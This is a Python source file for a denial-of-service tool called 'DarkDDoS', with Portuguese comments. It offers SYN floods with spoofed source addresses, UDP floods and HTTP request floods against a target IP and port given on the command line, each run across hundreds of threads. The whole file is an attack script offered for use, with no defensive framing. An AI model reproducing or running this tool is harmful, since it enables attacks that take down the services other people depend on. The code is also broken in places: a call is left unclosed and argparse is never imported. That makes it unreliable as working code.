import sys
import time
import socket
import threading
import random
import requests
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP

# Configuração
BUFFER_SIZE = 4096
MAX_RETRIES = 5  
SOCKET_TIMEOUT = 3  

class DarkDDoS:
    def __init__(self):
        self.running = True
        self.stats = {"packets_sent": 0, "errors": 0}
        self.lock = threading.Lock()

    def _generate_fake_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

    def _syn_flood(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                packet = IP(src=self._generate_fake_ip(), dst=self.target_ip)/TCP(
                    sport=random.randint(1024, 65535),
                    dport=self.target_port,
                    flags="S",
                    window=64240,
                    seq=random.getrandbits(32)
                
                s.sendto(bytes(packet), (self.target_ip, 0))
                with self.lock:
                    self.stats["packets_sent"] += 1
            except Exception as e:
                with self.lock:
                    self.stats["errors"] += 1
                time.sleep(SOCKET_TIMEOUT)
            finally:
                s.close() if 's' in locals() else None

    def _udp_flood(self):
        payload = random._urandom(BUFFER_SIZE)
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.sendto(payload, (self.target_ip, self.target_port))
                with self.lock:
                    self.stats["packets_sent"] += 1
            except Exception as e:
                with self.lock:
                    self.stats["errors"] += 1
                time.sleep(SOCKET_TIMEOUT)
            finally:
                s.close() if 's' in locals() else None

    def _http_flood(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        }
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(SOCKET_TIMEOUT)
                s.connect((self.target_ip, self.target_port))
                s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.target_ip}\r\n".encode())
                for header, value in headers.items():
                    s.send(f"{header}: {value}\r\n".encode())
                s.send("\r\n".encode())
                with self.lock:
                    self.stats["packets_sent"] += 1
            except Exception as e:
                with self.lock:
                    self.stats["errors"] += 1
            finally:
                s.close() if 's' in locals() else None

    def _monitor(self):
        while self.running:
            time.sleep(5)
            with self.lock:
                print(f"\n[+] Estatísticas - Pacotes: {self.stats['packets_sent']} | Erros: {self.stats['errors']}")

    def start(self, target_ip, target_port, method="syn", threads=500, duration=0):
        self.target_ip = target_ip
        self.target_port = target_port
        
        print(f"[+] Iniciando ataque {method.upper()} em {target_ip}:{target_port}")
        print(f"[+] Threads: {threads} | Modo: Persistente" if duration == 0 else f" | Duração: {duration}s")

        
        threading.Thread(target=self._monitor, daemon=True).start()

        
        for _ in range(threads):
            t = threading.Thread(target=getattr(self, f"_{method}_flood"))
            t.daemon = True
            t.start()

        try:
            if duration > 0:
                time.sleep(duration)
                self.running = False
                print("\n[!] Ataque programado concluído")
            else:
                while True:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] Ataque interrompido pelo usuário")
        
        sys.exit(0)

if __name__ == "__main__":
    # Exemplo de uso:
    # python3 DarkDDoS.py -t 192.168.1.100 -p 80 -m http -th 1000 -d 0
    parser = argparse.ArgumentParser(description="DarkDDoS v2.0 - Ferramenta Avançada")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-p", "--port", type=int, required=True)
    parser.add_argument("-m", "--method", choices=["syn", "udp", "http"], default="syn")
    parser.add_argument("-th", "--threads", type=int, default=500)
    parser.add_argument("-d", "--duration", type=int, default=0)
    args = parser.parse_args()

    DarkDDoS().start(args.target, args.port, args.method, args.threads, args.duration)
